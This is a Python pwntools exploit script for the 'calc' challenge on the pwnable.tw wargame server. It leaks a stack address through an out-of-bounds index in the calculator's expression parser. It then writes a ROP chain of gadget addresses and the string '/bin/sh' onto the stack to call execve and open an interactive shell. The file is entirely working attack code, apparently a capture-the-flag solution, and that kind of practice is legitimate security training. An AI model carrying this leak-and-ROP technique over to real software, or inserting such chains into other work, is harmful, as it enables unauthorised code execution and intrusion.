import os
from pwn import *
import binascii as b

pc = './calc'

#p = process(pc)
#gdb.attach(p,'b *0x080493EA\n b *0x08049133\n b* 0x0804924C')
#gdb.attach(p,'b *0x0804941E')

context.arch = 'i386'
context.log_level = True

remote_ip = 'chall.pwnable.tw'
remote_port = 10100
p = remote(remote_ip,remote_port)
def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def rop_g(pre,a):
	payload = pre
	p.sendline(payload)
	num = recv2int()
	if num > a:
		tmp = '-'+str(num-a)
	else:
		tmp = '+'+str(a-num)
	payload = pre + tmp
	p.sendline(payload)
	p.recvline()
	

def recv2int():
	return int(p.recvline().strip('\n'))

def hack():
	raw_input()
	#step 1: leak ebp
	p.recvuntil('===\n')
	payload = '+360'
	p.sendline(payload)
	num = recv2int()
	#ebp_addr = 0x100000000 + num
	ebp_addr = num
	lg('ebp_addr',ebp_addr)
	#print p32(ebp_addr)

	#step 2: ROP
	pop_eax = 0x0805c34b
	#pop_ebx = 0x080481d1
	pop_edx_ecx_ebx = 0x080701d0
	int_80 = 0x08049a21
	rop_g('+361',pop_eax)
	rop_g('+362',11)
	rop_g('+363',pop_edx_ecx_ebx)
	rop_g('+364',0)
	rop_g('+365',0)
	rop_g('+366',ebp_addr)
	rop_g('+367',int_80)
	#payload = '/bin/sh\0'
	rop_g('+368',int(b.b2a_hex('nib/'),16))
	rop_g('+369',int(b.b2a_hex('hs/'),16))
	
	

	p.interactive()

hack()